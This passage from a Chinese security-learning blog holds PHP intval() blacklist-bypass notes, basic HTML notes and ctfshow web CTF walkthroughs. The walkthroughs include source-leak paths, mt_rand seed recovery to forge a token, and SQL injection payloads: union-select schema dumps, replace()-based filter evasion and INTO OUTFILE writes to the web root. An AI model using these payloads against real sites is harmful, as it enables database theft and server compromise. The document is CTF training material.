class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(intval(~10));  \\ -11</span><br><span class="line">var_dump(intval(~~10)); \\ 10</span><br></pre></td></tr></table></figure><h3 id="算数运算符绕过"><a href="#算数运算符绕过" class="headerlink" title="算数运算符绕过"></a>算数运算符绕过</h3><p>当某个数字被过滤时，可以使用算数运算符绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump(intval(5*5));</span><br><span class="line">var_dump(intval(5+5));</span><br><span class="line">var_dump(intval(05+5));</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int(25)</span><br><span class="line">int(10)</span><br><span class="line">int(10)</span><br></pre></td></tr></table></figure><h3 id="SQL注入intval-函数绕过黑名单方法"><a href="#SQL注入intval-函数绕过黑名单方法" class="headerlink" title="SQL注入intval()函数绕过黑名单方法"></a>SQL注入intval()函数绕过黑名单方法</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#flag in id=1000</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/or|\-|\\|\*|\&lt;|\&gt;|\!|x|hex|\+/i&quot;</span>,<span class="variable">$id</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;id error&quot;</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$id</span>) &gt; <span class="number">999</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;id error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment"># id 小于 999 拼接sql语句</span></span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from article where id = <span class="subst">$id</span> order by id limit 1 &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">根据黑名单的不同，访问?id=<span class="number">1000</span>有以下几种方法:</span><br><span class="line">?id=<span class="string">&#x27;1000&#x27;</span> <span class="comment">//&quot;1000&quot;或(1000)皆可</span></span><br><span class="line">?id=<span class="number">125</span>&lt;&lt;<span class="number">3</span> <span class="comment">//左移</span></span><br><span class="line">?id=<span class="number">680</span>|<span class="number">320</span> <span class="comment">//按位或</span></span><br><span class="line">?id=<span class="number">992</span>^<span class="number">8</span> <span class="comment">//按位异或</span></span><br><span class="line">?id=~~<span class="number">1000</span> <span class="comment">//两次取反</span></span><br><span class="line">?id=<span class="number">0x3e8</span> <span class="comment">//十六进制</span></span><br><span class="line">?id=<span class="number">0b1111101000</span> <span class="comment">//二进制</span></span><br></pre></td></tr></table></figure><h2 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>前端基础学习</title>
      <link href="/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0.html"/>
      <url>/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0.html</url>
      
        <content type="html"><![CDATA[<p><img src="/img/image-20231028104405040.png" alt="image-20231028104405040"></p><p> <code>&lt;!DOCTYPE&gt;</code>：文档类型声明，作用是告诉浏览器使用哪种HTML版本来显示网页</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;  </span><br></pre></td></tr></table></figure><p>代码意思是当前页面采取的是HTML5版本来显示网页</p><p><code>lang</code>：定义显示语言，这个属性主要对浏览器是否翻译网页有用，不影响非定义中的语言的显示  </p><p><code>meta</code>标签中的<code>charset</code>属性用来规定html文档应该使用哪种字符编码</p><h2 id="html常用标签"><a href="#html常用标签" class="headerlink" title="html常用标签"></a>html常用标签</h2><p><code>&lt;br /&gt;</code>：换行标签</p><p><code>&lt;div&gt;、&lt;span&gt; </code>：盒子标签，用来装内容</p><p><code>&lt;img src=&quot;图像URL&quot; /&gt;</code>:图像标签，相对路径是相对html文件，如果直接是图片名，说明在同一级。也可以使用绝对路径，网络上的或者本地从盘符开始</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alt：图片显示不出来代替的文字</span><br><span class="line">title：鼠标放在图片上提示的文字 </span><br></pre></td></tr></table></figure><p><code>&lt;a&gt;</code>:超链接标签</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;跳转目标&quot; target=&quot;目标窗口的弹出方式&quot;&gt;文本或图像&lt;/a&gt;</span><br><span class="line">target:_self(默认 替换当前页面)、_blank(新窗口打开)</span><br></pre></td></tr></table></figure><p>链接分类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">外部链接:例如&lt;a href= &quot;http://www.baidu.com&quot;&gt;百度&lt;/a&gt;</span><br><span class="line">内部链接:网站内部页面之间的相互链接,直接链接内部页面名称即可,例如&lt;a href=&quot;index.html&quot;&gt;首页&lt;/a&gt;</span><br><span class="line">空链接：&lt;a href=&quot;#&quot;&gt;地址&lt;/a&gt;，开发过程中</span><br><span class="line">下载链接:如果href里面地址是一个文件.exe或者压缩包.zip,会下载这个文件</span><br><span class="line"></span><br><span class="line">网页元素链接:在网页中的各种网页元素,如文本、图像、表格、音频、视频等都可以添加超链接</span><br><span class="line">&lt;a href=&quot;http://www.baidu.com&quot;&gt;&lt;img src=&quot;img.jpg&quot;/&gt;&lt;/a&gt; 点击图片即可跳转</span><br><span class="line">  </span><br><span class="line">锚点链接:点击链接，可以快速定位到页面中的某个位置</span><br><span class="line">在链接文本的href属性中,设置属性值为#名字的形式,如&lt;a href=&quot;#two&quot;&gt;第2集&lt;/a&gt;</span><br><span class="line">找到目标位置标签,里面添加一个id属性=刚才的名字, 如: &lt;h3 id=&quot;two&quot;&gt;第2集介绍&lt;/h3&gt;</span><br></pre></td></tr></table></figure><p><code>&lt;!-- 注释语句 --&gt;</code>：注释标签，可在源代码中显示</p><p>特殊字符：在HTML页面中,一些特殊的符号很难或者不方便直接使用 ,此时我们就可以使用下面的字符来替代</p><p><img src="/img/image-20231028114851140.png" alt="image-20231028114851140"></p><h3 id="表格标签-用来展示数据"><a href="#表格标签-用来展示数据" class="headerlink" title="表格标签:用来展示数据"></a>表格标签:用来展示数据</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;table&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;th&gt;姓名&lt;/th&gt;</span><br><span class="line">&lt;td&gt;单元格内的文字&lt;/td&gt;</span><br><span class="line">...</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">...</span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;table&gt;:定义表格，&lt;tr&gt;定义表格中的行，&lt;td&gt;：定义表格中的单元格。&lt;th&gt;表头标签。都是双标签</span><br><span class="line">&lt;thead&gt; &lt;/thead&gt; :用于定义表格的头部。&lt;thead&gt; 内部必须拥有&lt;tr&gt;标签。一般是位于第一行</span><br><span class="line">&lt;tbody&gt; &lt;/tbody&gt; :用于定义表格的主体,主要用于放数据本体</span><br></pre></td></tr></table></figure><h3 id="列表标签：用来布局"><a href="#列表标签：用来布局" class="headerlink" title="列表标签：用来布局"></a>列表标签：用来布局</h3><p>1、无序列表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;u1&gt;</span><br><span class="line">&lt;li&gt;列表项1&lt;/li&gt;</span><br><span class="line">&lt;li&gt;列表项2&lt;/li&gt;</span><br><span class="line">&lt;li&gt;列表项3&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure><p>2、有序列表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;ol&gt;</span><br><span class="line">&lt;1i&gt;列表项1&lt;/li&gt;</span><br><span class="line">&lt;li&gt;列表项2&lt;/1i&gt;</span><br><span class="line">&lt;1i&gt;列表项3&lt;/li&gt;</span><br><span class="line">&lt;/o1&gt;</span><br></pre></td></tr></table></figure><p>3、自定义列表（重点）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dl&gt;</span><br><span class="line">&lt;dt&gt;名词1&lt;/dt&gt;</span><br><span class="line">&lt;dd&gt;名词1解释1&lt;/dd&gt;</span><br><span class="line">&lt;dd&gt;名词1解释2&lt;/dd&gt;</span><br><span class="line">&lt;/d1&gt;</span><br></pre></td></tr></table></figure><h3 id="表单标签"><a href="#表单标签" class="headerlink" title="表单标签"></a>表单标签</h3><p>目的：收集用户信息</p><p>组成：在HTML中,一个完整的表单通常由表单域、表单控件(也称为表单元素)和提示信息3个部分构成</p><p>1、表单域</p><p>表单域是一个包含表单元素的区域。在HTML标签中，<code>&lt;form&gt; </code>标签用于定义表单域,以实现用户信息的收集和传递。<code>&lt;form&gt;</code>会把它范围内的表单元素信息提交给服务器，那么如果点击提交按钮就会跳转到url地址，如果是get，就会是xxx.php?pwd&#x3D;x&amp;username&#x3D;X</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;url地址&quot; method=&quot;提交方式&quot; name=&quot;表单域名称&quot;&gt;</span><br><span class="line">各种表单元素控件</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p><img src="/img/image-20231028201629013.png" alt="image-20231028201629013"></p><p>2、表单控件</p><p>在表单域中可以定义各种表单元素,这些表单元素就是允许用户在表单中输入或者选择的内容控件。</p><p>(1) input输入表单元素 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;属性值&quot; /&gt;</span><br></pre></td></tr></table></figure><p><img src="/img/image-20231028202317577.png" alt="image-20231028202317577"></p><p>提交表单元素，value规定按钮中的文字内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;submit&quot; value=&quot;免费注册&quot;&gt;</span><br></pre></td></tr></table></figure><p><strong>button</strong>用来和js搭配使用，启动js脚本的动作</p><p><strong>file</strong>上传文件</p><p>除了type属性外<code>&lt;input&gt;</code>标签的其他属性</p><p><img src="/img/image-20231028203442210.png" alt="image-20231028203442210"></p><p><strong>name</strong>属性区分表单元素，单选和多选的每个表单元素需要有相同的name属性</p><p><strong>checked</strong>主要针对单选和复选框，页面打开的时候默认选中</p><p><strong>value</strong>在非选择框中规定输入框中默认的文字，在选择框中代表选择之后送到后台的内容</p><h4 id="一个关于表单的测试"><a href="#一个关于表单的测试" class="headerlink" title="一个关于表单的测试"></a>一个关于表单的测试</h4><p><img src="/img/image-20231028205221478.png" alt="image-20231028205221478"></p><p><img src="/img/image-20231028205247822.png" alt="image-20231028205247822"></p><p>观察到url地址的变化，转到action指定的处理脚本路径，后面是对应的get传参，参数名就是前面input标签中定义的name属性值。但是由于我没有提前在网站根目录中创建login.php文件，所以显示无法找到</p><p><img src="/img/image-20231028205313188.png" alt="image-20231028205313188"></p><p>补充：<code>&lt;label&gt;</code>标签用于绑定一个表单元素 当点击<code>&lt;label&gt;</code>内的文本时,浏览器就会自动将焦点(光标转到或者<br>选择对应的表单元素上用来增加用户体验</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">男&lt;input type=&quot;radio&quot; name=&quot;sex&quot;/&gt;</span><br><span class="line">-&gt;</span><br><span class="line">&lt;label for=&quot;sex&quot;&gt;男&lt;/label&gt;&lt;input type=&quot;radio&quot; name=&quot;sex&quot; id=&quot;sex&quot; /&gt;</span><br></pre></td></tr></table></figure><p>id属性和label中的for属性需一致</p><p>（2）select下拉表单元素</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;select&gt;</span><br><span class="line">&lt;option&gt;选项1&lt;/option&gt;</span><br><span class="line">&lt;option&gt;选项2&lt;/option&gt;</span><br><span class="line">&lt;option&gt;选项3&lt;/opt ion&gt;</span><br><span class="line">&lt;/select&gt;</span><br></pre></td></tr></table></figure><p>在<code>&lt;option&gt;</code>中定义selected &#x3D;”selected”时,当前项即为默认选中项</p><p>（3）textarea 文本域元素</p><p>使用场景:当用户输入内容较多的情况下,我们就不能使用文本框表单了,此时我们可以使用该标签。评论、反馈</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;textarea rows=&quot;3&quot; cols=&quot;20&quot;&gt;</span><br><span class="line">默认文本内容</span><br><span class="line">&lt;/textarea&gt;</span><br></pre></td></tr></table></figure><p>cols每行字符数，rows显示的行数</p><p><strong>关于html常用的vscode插件</strong><br>1、Auto Rename Tag:双击html的标签并修改会前后一起改变<br>2、One Dark Pro:一款颜色主题<br>3、系统自带格式化：设置-&gt;文本编辑器-&gt;格式化-&gt;勾上format on paste和format on save<br>4、open in browser ：可以在浏览器中显示页面<br>右键选择open in default browser在默认浏览器打开<br>5、Live Server(推荐) ： 实时预览，但首先需要打开一个文件夹<br>右键选择open in Live Server，也是在浏览器中打开但和上面不同的是内容会随代码的改变而实时变化<br>6、Easy LESS ： 我们写的less不能直接引入到html文件中，通过这个插件可以自动帮我们生成css文件<br>7、会了吧 ： 英文翻译，点击左侧的会<br>8、vscode-icons 图标修改</p><p><strong>vscode常用快捷键</strong></p><ul><li>ctrl + -&#x2F;+ ：缩小放大代码</li><li>shift + alt + 下键 ： 选中某行并复制到下一行</li><li>ctrl + d ：先双击选定一个单词，然后按下ctrl+d可以往下依次选择相同的单词，这样同时修改相同的单词就非常方便</li><li>ctrl + alt+  上或下：添加多个光标，可以同时添加内容</li><li>ctrl + h：全局查找替换某个单词</li><li>ctrl + g：跳转到某行</li><li>shift + alt 然后拖动鼠标选中一个区块，可以一起删除</li><li>ctrl + &#x2F; ：单行注释</li><li>自定义快捷键：左下角管理-&gt;键盘快捷方式，查找shift + alt + a(原本的多行注释快捷键)，点击修改，直接按键修改，回车就修改成功，那么多行注释就变成ctrl + shift + &#x2F;</li></ul><h2 id="javascript"><a href="#javascript" class="headerlink" title="javascript"></a>javascript</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-web入门</title>
      <link href="/ctfshow-web%E5%85%A5%E9%97%A8.html"/>
      <url>/ctfshow-web%E5%85%A5%E9%97%A8.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个只选择性的摘录ctfshow中的web入门题目，作为后面复习的资料</p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>当右键被禁掉的时候可以使用ctrl+u查看网页源代码</p><h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><p>.开头的文件夹在linux操作系统中是隐藏文件，所以开发人员可能错误地将.git文件夹部署到生产环境中，导致源码泄露等问题。.svn同理，svn也是一个版本控制软件<br>本题直接访问&#x2F;.git</p><h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><p>在linux中使用vim更改文件内容，如果非正常退出就会产生一个交换文件，如：index.php.swp,会以隐藏文件的形式在文件夹下<br>本题直接访问下载&#x2F;index.php.swp</p><h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><p>f12，刷新页面，打开存储中的cookie</p><p><img src="/img/image-20231022180505270.png" alt="image-20231022180505270"></p><p>flag需要解码，这里可以使用hackbar自带的</p><p><img src="/img/image-20231022180703155.png" alt="image-20231022180703155"></p><h2 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h2><p>域名解析查询</p><p><a href="https://ipw.cn/dns/">https://ipw.cn/dns/</a></p><p><img src="/img/image-20231022192951769.png" alt="image-20231022192951769"></p><h2 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h2><p>题目：对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</p><p>访问&#x2F;tz.php,点击查看phpinfo</p><p><img src="/img/image-20231022202609335.png" alt="image-20231022202609335"></p><p>flag在环境变量里，这也是信息泄露的一种</p><h2 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h2><p>题目：备份的sql文件会泄露敏感信息</p><p>&#x2F;backup.sql</p><h2 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h2><p>题目：不要着急，休息，休息一会儿，玩101分给你flag</p><p>右键源代码</p><p><img src="/img/image-20231022204735548.png" alt="image-20231022204735548"></p><p>查看js文件</p><p><img src="/img/image-20231022204809378.png" alt="image-20231022204809378"></p><p>控制台直接运行弹窗</p><p><img src="/img/image-20231022204849578.png" alt="image-20231022204849578"></p><p><img src="/img/image-20231022204904625.png" alt="image-20231022204904625"></p><h2 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h2><p>题目：密钥什么的，就不要放在前端了</p><p>根据提示直接右键源代码</p><p><img src="/img/image-20231023195713890.png" alt="image-20231023195713890"></p><p>可以直接post提交账号密码，也可以通过AES解密获得密码登录，这里直接放出了密钥的加密过程，AES所必须的密码和偏移量都知道了，选择ZeroPadding填充，CBC模式，hex编码输出，base64不行</p><p><img src="/img/image-20231023200453885.png" alt="image-20231023200453885"></p><h2 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h2><p><img src="/img/image-20231102190423779.png" alt="image-20231102190423779"></p><p>取消url编码 因为在进行base64加密的时候在最后可能存在 &#x3D;&#x3D; ,如果进行url编码就会影响base64加密的结果</p><p><img src="/img/image-20231102190726078.png" alt="image-20231102190726078"></p><h2 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h2><p><img src="/img/image-20231102193815520.png" alt="image-20231102193815520"></p><p>这题给我的思路就是如果代码看不懂，可以把代码搬到本地爆破调试，当通过两个if的时候有输出提示</p><p><img src="/img/image-20231102193931184.png" alt="image-20231102193931184"></p><p><img src="/img/image-20231102194000656.png" alt="image-20231102194000656"></p><h2 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h2><p><img src="/img/image-20231102195258485.png" alt="image-20231102195258485"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mt_srand(372619038);</span><br><span class="line">echo intval(mt_rand());</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ps:不同版本的php得出的结果有差异</p><h2 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h2><p>考点是如果知道随机数中的某个值，有概率反推出seed</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="title function_ invoke__">hexdec</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>), <span class="number">0</span>,<span class="number">8</span>)));</span><br><span class="line">    <span class="variable">$rand</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)-<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line">    <span class="keyword">if</span>((!<span class="variable">$rand</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>]==(<span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$rand</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这题的种子没有直接告诉我们，但是要获得flag，必须传入正确的token，所以要反推seed。</p><p>我们可以通过让intval（$r）&#x3D;0 让$rand不为0不满足if条件输出rand的值，同时可以获得mt_rand()第一次产生的随机数值的负数形式</p><p><img src="/img/image-20231102201425306.png" alt="image-20231102201425306"></p><p>使用随机数反推seed工具</p><p><img src="/img/image-20231102201452631.png" alt="image-20231102201452631"></p><p>因为上一题是用7.3版本得出正确的随机数，所以我们这一题自然想先尝试7.1.0+版本，图中的16和10进制都可以，是等价的。要注意的是seed确定之后每次生成的随机数是固定的，第一二三次的值固定，所以第一次生成随机数的操作不能省略。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">0x7135c313</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>(). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$token</span>=(<span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$token</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到token，传入cookie</p><p><img src="/img/image-20231102202705326.png" alt="image-20231102202705326"></p><p>别忘了传r，根据if的条件，$rand要等于0，所以传入<code>?r=435058645</code>,刷新得到flag</p><p>ctfshow{e8e1e54d-da65-42bd-9a4b-6f88ccf56c43}</p><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>在bp中传参时末尾的+不要url编码</p><h3 id="171"><a href="#171" class="headerlink" title="171"></a>171</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 查数据库</span><br><span class="line">-1&#x27;union select 1,2,group_concat(schema_name) from information_schema.schemata--+</span><br><span class="line"># 查表名</span><br><span class="line">-1&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</span><br><span class="line"># 查列名</span><br><span class="line">-1&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_user&#x27; --+</span><br><span class="line"># 查flag</span><br><span class="line">-1&#x27;union select id,username,password from ctfshow_user --+</span><br></pre></td></tr></table></figure><h3 id="172"><a href="#172" class="headerlink" title="172"></a>172</h3><p>题目：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//检查结果是否有flag</span><br><span class="line">    if($row-&gt;username!==&#x27;flag&#x27;)&#123;</span><br><span class="line">      $ret[&#x27;msg&#x27;]=&#x27;查询成功&#x27;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>payload:</p><p>1、不查询username字段，绕过检测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;union select id,password from ctfshow_user2 --+</span><br></pre></td></tr></table></figure><p>2、编码绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;union select to_base64(username),hex(password) from ctfshow_user2 --+</span><br></pre></td></tr></table></figure><p>3、通过171的题目入口联合查询ctfshow_user2，171没有过滤。前提是两个表在一个库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,username,password from ctfshow_user2 where ctfshow_user2.username = &#x27;flag&#x27; --+</span><br></pre></td></tr></table></figure><p>4、3的衍生，使用别名,防止列名重复</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,b.username,b.password from ctfshow_user2 as b where b.username = &#x27;flag&#x27; --+</span><br></pre></td></tr></table></figure><h3 id="174"><a href="#174" class="headerlink" title="174"></a>174</h3><p>mysql常用字符串函数：<a href="https://www.cnblogs.com/geaozhang/p/6739303.html">https://www.cnblogs.com/geaozhang/p/6739303.html</a></p><p>题目：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//检查结果是否有flag</span><br><span class="line">    if(!preg_match(&#x27;/flag|[0-9]/i&#x27;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#x27;msg&#x27;]=&#x27;查询成功&#x27;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>使用replace函数替换flag中的数字</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9999&#x27;union select &#x27;a&#x27;,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(b.password,&#x27;0&#x27;,&#x27;)&#x27;),&#x27;1&#x27;,&#x27;!&#x27;),&#x27;2&#x27;,&#x27;@&#x27;),&#x27;3&#x27;,&#x27;#&#x27;),&#x27;4&#x27;,&#x27;$&#x27;),&#x27;5&#x27;,&#x27;%&#x27;),&#x27;6&#x27;,&#x27;^&#x27;),&#x27;7&#x27;,&#x27;&amp;&#x27;),&#x27;8&#x27;,&#x27;*&#x27;),&#x27;9&#x27;,&#x27;(&#x27;) from ctfshow_user4 as b where b.username = &#x27;flag --+</span><br></pre></td></tr></table></figure><p>但是一直报错，原来是发包有坑，发出去的id值不是完整的</p><p><img src="/img/image-20240417153255917.png" alt="image-20240417153255917"></p><p>完整的如下</p><p><img src="/img/image-20240417153311473.png" alt="image-20240417153311473"></p><p>这种是知道数据库名的前提下，由于数据库名也有数字，所有也要替换。除此之外我们可以使用盲注。</p><h3 id="175"><a href="#175" class="headerlink" title="175"></a>175</h3><p>1、写入网站根目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,password from ctfshow_user5 into outfile &#x27;/var/www/html/1.txt&#x27;--+</span><br></pre></td></tr></table></figure><p>2、写马，但连不上数据库</p><figure class="highlight plaintext"><table><tr><td 